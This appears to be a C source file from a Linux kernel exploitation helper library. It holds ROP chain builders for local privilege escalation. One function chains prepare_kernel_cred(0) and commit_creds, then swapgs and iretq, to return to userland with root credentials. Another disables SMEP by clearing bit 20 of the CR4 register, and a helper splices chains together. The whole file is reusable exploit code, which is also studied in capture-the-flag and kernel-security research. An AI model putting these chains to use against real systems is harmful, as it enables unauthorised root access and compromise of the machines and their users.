#include <stddef.h>
#include <stdint.h>
#include "utils.h"
#include "rop.h"

/* ============= Kcreds Commit ============= */

/* ROP: prepare_kernel_cred -> commit_creds -> swapgs -> iretq */
size_t chain_kcred_iretq(rop_chain_t rop,
                        uintptr_t pop_rdi_ret,
                        uintptr_t prepare_kernel_cred,
                        rop_chain_t mov_rdi_rax_rop,
                        uintptr_t commit_creds,
                        uintptr_t swapgs_pop_rbp_ret,
                        uintptr_t iretq,
                        iretq_user_ctx_t ctx)
{
    size_t i = 0;

    // Step 1: prepare_kernel_cred(0)
    PUSH_ROP(rop, i, pop_rdi_ret);
    PUSH_ROP(rop, i, 0x0);
    PUSH_ROP(rop, i, prepare_kernel_cred);

    // Step 2: rdi = rax (returned from prepare_kernel_cred)
    for (size_t j = 0; j < mov_rdi_rax_rop.count; ++j) {
        PUSH_ROP(rop, i, mov_rdi_rax_rop.chain[j]);
    }

    // Step 3: commit_creds(rdi)
    PUSH_ROP(rop, i, commit_creds);

    // Step 4: swapgs; pop rbp; ret
    PUSH_ROP(rop, i, swapgs_pop_rbp_ret);
    PUSH_ROP(rop, i, 0xdeadbeef);

    // Step 5: iretq — transition back to userland
    PUSH_ROP(rop, i, iretq);
    PUSH_ROP(rop, i, ctx.rip);
    PUSH_ROP(rop, i, ctx.cs);
    PUSH_ROP(rop, i, ctx.rflags);
    PUSH_ROP(rop, i, ctx.rsp);
    PUSH_ROP(rop, i, ctx.ss);

    return i;
}


/* ============= CR4 =============
 * (depreciated since Linux 5.1)
 * */

/* CR4 SMEP off: zero 20th bit */
size_t chain_cr4_smep(rop_chain_t rop,
                      uintptr_t pop_rdi_ret,
                      uintptr_t cr4_val,
                      uintptr_t mov_cr4_rdi_ret,
                      uintptr_t ret_addr)
{
    size_t i = 0;

    // Disable SMEP by clearing bit 20 of CR4
    cr4_val &= ~(1UL << 20);

    PUSH_ROP(rop, i, pop_rdi_ret);
    PUSH_ROP(rop, i, cr4_val);
    PUSH_ROP(rop, i, mov_cr4_rdi_ret);
    PUSH_ROP(rop, i, ret_addr); // Could be shell, pivot, or userland trampoline

    return i;
}


/* ============= ROP Helpers ==============*/

/* Copy |src_len| qwords from |src| into |dst| starting at |*off|,
 * then advance *off and return the new offset.                 */
size_t append_chain(uintptr_t *dst,
                    size_t *off,
                    const uintptr_t *src,
                    size_t src_len)
{
    for (size_t j = 0; j < src_len; ++j)
        dst[*off + j] = src[j]; // qword-by-qword copy
    *off += src_len;
    return *off;
}


